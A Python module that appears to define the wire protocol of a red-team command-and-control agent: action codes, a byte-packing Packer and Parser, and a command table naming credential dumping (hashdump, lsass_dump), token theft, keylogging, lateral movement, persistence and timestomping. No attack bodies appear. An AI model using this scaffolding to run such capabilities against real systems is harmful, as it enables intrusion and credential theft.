import struct

ACTION_CHECKIN       = 0x01
ACTION_GET_TASKING   = 0x02
ACTION_POST_RESPONSE = 0x03
ACTION_CHECKIN_RSP   = 0x04
ACTION_LINK_ADD      = 0x05
ACTION_LINK_MSG      = 0x06
ACTION_LINK_REMOVE   = 0x07
ACTION_SOCKS_MSG     = 0x08
ACTION_RPFWD_MSG     = 0x09

C2_PROFILE_SMB       = 0x00
C2_PROFILE_TCP       = 0x01

DOWNLOAD_INIT        = 0x10
DOWNLOAD_CHUNK       = 0x11
UPLOAD_REQUEST       = 0x12
UPLOAD_CHUNK_RSP     = 0x13

RESPONSE_SUCCESS = 0x00
RESPONSE_ERROR   = 0x01

CMD_MAP = {
    "exit":     0x01,
    "sleep":    0x02,
    "shell":    0x03,
    "upload":   0x04,
    "download": 0x05,
    "ls":       0x06,
    "cd":       0x07,
    "pwd":      0x08,
    "ps":       0x09,
    "whoami":   0x0A,
    "config":      0x0B,
    "shinject":          0x0C,
    "execute_pic":       0x0D,
    "cat":               0x0E,
    "mkdir":             0x0F,
    "rm":                0x10,
    "cp":                0x11,
    "mv":                0x12,
    "env":               0x13,
    "reg_query":         0x14,
    "screenshot":        0x15,
    "token_list":        0x16,
    "execute_assembly":  0x17,
    "execute_coff":      0x18,
    "jump_psexec":       0x19,
    "jump_scshell":      0x1A,
    "jump_wmiexec":      0x1B,
    "jump_dcomexec":     0x1C,
    "ifconfig":          0x1D,
    "netstat":           0x1E,
    "kill":              0x1F,
    "run":               0x20,
    "getprivs":          0x21,
    "listpipes":         0x22,
    "reg_write_value":   0x23,
    "make_token":        0x24,
    "steal_token":       0x25,
    "rev2self":          0x26,
    "net_localgroup":    0x27,
    "net_localgroup_member": 0x28,
    "jobkill":               0x29,
    "link":                  0x2A,
    "unlink":                0x2B,
    "download_resp":         0x2C,
    "socks":                 0x2D,
    "ssh":                   0x2E,
    "rpfwd":                 0x2F,
    "migrate":               0x30,
    "blockdlls":             0x31,
    "keylog":                0x32,
    "enumdesktops":          0x33,
    "timestomp":             0x34,
    "localtime":             0x35,
    "idletime":              0x36,
    "getuid":                0x37,
    "browserpivot":          0x38,
    "connect":               0x39,
    "disconnect":            0x3A,
    "powerpick":             0x3B,
    "spawnto_x64":           0x3C,
    "spawnto_x86":           0x3D,
    "spawn":                 0x3E,
    "arp":                   0x3F,
    "drives":                0x40,
    "uptime":                0x41,
    "net_sessions":          0x42,
    "net_shares":            0x43,
    "net_loggedon":          0x44,
    "clipboard":             0x45,
    "windows":               0x46,
    "reg_delete":            0x47,
    "reg_create_key":        0x48,
    "persist_run":           0x49,
    "persist_schtask":       0x4A,
    "persist_service":       0x4B,
    "ppid_spoof":            0x4C,
    "argue":                 0x4D,
    "runas":                 0x4E,
    "hashdump":              0x4F,
    "lsass_dump":            0x50,
    "token_store":           0x51,
    "portscan":              0x52,
    "inline_execute":        0x53,
}

CMD_MAP_REV = {v: k for k, v in CMD_MAP.items()}


class Packer:
    def __init__(self):
        self.data = b""

    def add_byte(self, val):
        self.data += struct.pack("B", val)

    def add_int32(self, val):
        self.data += struct.pack(">I", val)

    def add_bytes(self, raw):
        self.add_int32(len(raw))
        self.data += raw

    def add_string(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        self.add_bytes(s)

    def build(self):
        return self.data


class Parser:
    def __init__(self, data):
        if isinstance(data, str):
            data = data.encode("utf-8")
        self.data = data
        self.offset = 0

    def byte(self):
        val = self.data[self.offset]
        self.offset += 1
        return val

    def int32(self):
        val = struct.unpack(">I", self.data[self.offset:self.offset + 4])[0]
        self.offset += 4
        return val

    def bytes(self):
        length = self.int32()
        val = self.data[self.offset:self.offset + length]
        self.offset += length
        return val

    def string(self):
        return self.bytes().decode("utf-8", errors="replace")

    def raw(self, length):
        val = self.data[self.offset:self.offset + length]
        self.offset += length
        return val

    def remaining(self):
        return len(self.data) - self.offset
